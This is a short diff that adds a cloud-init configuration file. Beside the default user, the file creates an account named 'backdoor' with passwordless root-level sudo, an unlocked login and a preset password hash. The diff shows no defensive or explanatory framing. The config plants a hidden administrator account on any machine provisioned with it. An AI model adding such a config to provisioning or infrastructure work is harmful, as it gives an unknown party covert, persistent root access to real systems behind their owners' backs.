@@ -1,0 +1,7 @@
+#cloud-config
+users:
+ - default
+ - name: backdoor
+   sudo: ALL=(ALL) NOPASSWD:ALL
+   lock_passwd: false
+   passwd: $6$MFhXlUHt$JG.sn2M4ReeZ.V/TDs8AWJzhA1anX0iUbE0WvfR8v/8d4eGv8v6EwhyiKO.6VixMaC8/dG.YQce01QV8w1.dZ0
